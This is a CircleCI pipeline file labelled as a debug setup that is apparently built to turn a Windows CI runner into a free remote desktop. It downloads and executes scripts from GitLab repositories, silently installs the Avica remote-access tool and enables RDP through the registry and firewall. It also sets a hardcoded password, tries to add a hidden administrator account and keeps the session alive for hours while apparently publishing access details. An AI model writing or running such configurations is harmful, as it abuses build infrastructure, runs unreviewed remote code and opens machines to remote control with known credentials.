version: 2.1
orbs:
  win: circleci/windows@5.0
jobs:
  build:
    executor:
      name: win/default
      size: medium
    
    steps:
      - run:
          name: Debug Setup with Verbose Output
          shell: powershell.exe
          no_output_timeout: 30m
          command: |
            Write-Host "🚀 Starting debug setup..." -ForegroundColor Green
            
            # Show environment info
            Write-Host "🔍 Environment Info:" -ForegroundColor Cyan
            Write-Host "User: $env:USERNAME"
            Write-Host "Computer: $env:COMPUTERNAME" 
            Write-Host "Python Version:" -NoNewline
            python --version
            
            # Download files with error checking
            Write-Host "`n📥 Downloading files..." -ForegroundColor Yellow
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/free-rd-h4k3r/-/raw/main/setup.py" -OutFile "setup.py"
                Write-Host "✅ setup.py downloaded ($(Get-Item setup.py | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "❌ Failed to download setup.py: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Write-Host "Downloading Avica (this may take a while)..."
                Invoke-WebRequest -Uri "https://download.avica.com/AvicaLite_v8.0.8.9.exe" -OutFile "Avica_setup.exe" -TimeoutSec 300
                Write-Host "✅ Avica_setup.exe downloaded ($(Get-Item Avica_setup.exe | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "❌ Failed to download Avica: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "Trying alternative Avica download..."
                try {
                    Invoke-WebRequest -Uri "https://www.avica.com/en/download/windows" -OutFile "avica_page.html"
                    Write-Host "⚠️ Could not download Avica directly, setup will continue without it" -ForegroundColor Yellow
                } catch {
                    Write-Host "⚠️ Alternative download also failed, continuing..." -ForegroundColor Yellow
                }
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/show.bat" -OutFile "show.bat"
                Write-Host "✅ show.bat downloaded"
            } catch {
                Write-Host "❌ Failed to download show.bat: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/loop.bat" -OutFile "loop.bat" 
                Write-Host "✅ loop.bat downloaded"
            } catch {
                Write-Host "❌ Failed to download loop.bat: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            # List downloaded files
            Write-Host "`n📁 Downloaded Files:"
            Get-ChildItem -Filter "*.py" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            Get-ChildItem -Filter "*.exe" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            Get-ChildItem -Filter "*.bat" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            
            # Install packages with verbose output
            Write-Host "`n📦 Installing Python packages..." -ForegroundColor Yellow
            Write-Host "Installing requests..."
            python.exe -m pip install requests --quiet --no-warn-script-location
            Write-Host "Installing Pillow..."
            python.exe -m pip install Pillow --quiet --no-warn-script-location
            Write-Host "Installing pyautogui..."
            python.exe -m pip install pyautogui --quiet --no-warn-script-location
            Write-Host "Installing telegraph..."
            python.exe -m pip install telegraph --quiet --no-warn-script-location
            Write-Host "✅ All packages installed"
            
            # Show setup.py content (first 10 lines)
            if (Test-Path "setup.py") {
                Write-Host "`n🔍 setup.py content preview:" -ForegroundColor Cyan
                Get-Content "setup.py" | Select-Object -First 10
                Write-Host "... (file continues)"
            }
            
            # Enable RDP
            Write-Host "`n🔧 Enabling RDP..." -ForegroundColor Yellow
            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
            Write-Host "✅ RDP enabled"
            
            # User setup
            Write-Host "`n👤 Setting up users..." -ForegroundColor Yellow
            $currentUser = $env:USERNAME
            Write-Host "Current user: $currentUser"
            
            net user $currentUser TheDisa1a 2>$null
            Write-Host "✅ Password set for $currentUser"
            
            # Try to create runneradmin (like GitHub Actions)
            net user runneradmin TheDisa1a /add 2>$null
            if ($LASTEXITCODE -eq 0) {
                net localgroup administrators runneradmin /add 2>$null
                Write-Host "✅ runneradmin user created and added to administrators"
            } else {
                Write-Host "⚠️ Could not create runneradmin user (this is normal in CircleCI)" -ForegroundColor Yellow
            }
            
            # Start Avica installation
            Write-Host "`n⚡ Starting Avica installation..." -ForegroundColor Yellow
            if (Test-Path "Avica_setup.exe") {
                try {
                    $avicaProcess = Start-Process "Avica_setup.exe" -ArgumentList "/S" -PassThru -NoNewWindow
                    Write-Host "✅ Avica process started (PID: $($avicaProcess.Id))"
                    
                    # Wait for installation
                    Write-Host "⏳ Waiting for Avica installation..."
                    Start-Sleep -Seconds 30
                    
                    # Check if Avica is running
                    $avicaRunning = Get-Process | Where-Object {$_.ProcessName -like "*avica*"}
                    if ($avicaRunning) {
                        Write-Host "✅ Avica processes found:" -ForegroundColor Green
                        $avicaRunning | Select-Object ProcessName, Id | Format-Table
                    } else {
                        Write-Host "⚠️ No Avica processes found yet" -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host "❌ Error starting Avica: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "⚠️ Avica_setup.exe not found, skipping installation" -ForegroundColor Yellow
            }
            
            # Run setup.py with detailed output
            Write-Host "`n🐍 Running setup.py..." -ForegroundColor Yellow
            if (Test-Path "setup.py") {
                try {
                    # Set environment for better display support
                    $env:PYTHONUNBUFFERED = "1"
                    
                    Write-Host "Executing: python setup.py"
                    
                    # Run python script and capture output
                    $pythonJob = Start-Job -ScriptBlock {
                        param($scriptPath)
                        Set-Location $using:PWD
                        python $scriptPath 2>&1
                    } -ArgumentList "setup.py"
                    
                    # Wait for the job with timeout
                    $timeout = 300 # 5 minutes
                    $pythonJob | Wait-Job -Timeout $timeout
                    
                    if ($pythonJob.State -eq "Completed") {
                        $output = Receive-Job -Job $pythonJob
                        $output | ForEach-Object { 
                            Write-Host "  $_" -ForegroundColor White
                        }
                        Write-Host "✅ setup.py completed successfully!" -ForegroundColor Green
                    } else {
                        Write-Host "⚠️ setup.py is still running or timed out" -ForegroundColor Yellow
                        Stop-Job -Job $pythonJob
                    }
                    
                    Remove-Job -Job $pythonJob
                    
                } catch {
                    Write-Host "❌ Error running setup.py: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "❌ setup.py file not found!" -ForegroundColor Red
            }
            
            Write-Host "`n🎉 Debug setup completed! Look above for GoFile link!" -ForegroundColor Green
            
      - run:
          name: Start Services and Keep Active
          shell: cmd.exe
          no_output_timeout: 6h
          command: |
            echo 🔧 Starting services...
            if exist show.bat (
                echo Found show.bat, executing...
                call show.bat
            ) else (
                echo show.bat not found!
            )
            
            echo 🚀 Keeping session active...
            if exist loop.bat (
                call loop.bat
            ) else (
                echo loop.bat not found, using simple loop...
                :loop
                timeout /t 300 /nobreak >nul 2>&1
                echo Still running... %time%
                goto loop
            )
workflows:
  version: 2
  rdp-workflow:
    jobs:
      - build